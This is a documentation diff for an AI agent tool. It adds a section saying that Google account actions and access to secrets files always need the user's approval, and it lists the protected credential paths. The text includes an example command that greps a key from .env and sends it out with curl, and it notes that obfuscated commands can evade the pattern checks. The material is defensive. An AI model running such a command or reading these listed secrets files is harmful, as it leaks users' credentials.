@@ -235,6 +235,24 @@ The following patterns trigger approval prompts (defined in `tools/approval.py`)
 | `docker context use` | Switches the default daemon for all future docker commands |
 | `podman --remote`/`-r`/`--url`/`--connection`/`--identity`, `CONTAINER_HOST=` | Podman remote daemon redirect |
 
+#### Always the user's call
+
+Two kinds of command are never handed to the smart-approval model, even in `approvals.mode: smart`,
+and are refused outright in cron and other unattended runs (`cron_mode: deny`, the default):
+
+| What | Examples |
+|------|----------|
+| Acting on the user's Google account | `scout google gmail send/reply`, `calendar create/delete`, `drive share/upload/delete` |
+| Touching a secrets file — read or write | `.env` / `.env.<stage>` anywhere (not `.env.example`), `~/.scout/auth.json`, `google_token.json`, `google_client_secret.json`, `mcp-tokens/`, `~/.ssh/id_*` (not `.pub`), `~/.aws/credentials`, `~/.netrc` |
+
+A secrets-file prompt offers **once** or **deny** only — never "for this session" or "always" — so
+each access is a fresh decision. The same check covers `execute_code` scripts (`open('.env')`)
+regardless of any earlier "allow scripts" grant. `read_file` refuses these files without asking,
+and terminal output is redacted, but redaction cannot stop a command that sends a key out
+(`curl …?k=$(grep KEY .env)`) — which is why the command itself needs you. Pattern matching can be
+evaded by a sufficiently obfuscated command; the hard boundary is a container backend (below),
+where the host's secrets files are not present at all.
+
 :::info
 **Container bypass**: When running in `docker`, `singularity`, `modal`, `daytona`, or `vercel_sandbox` backends, dangerous command checks are **skipped** because the container itself is the security boundary. Destructive commands inside a container can't harm the host.
 :::
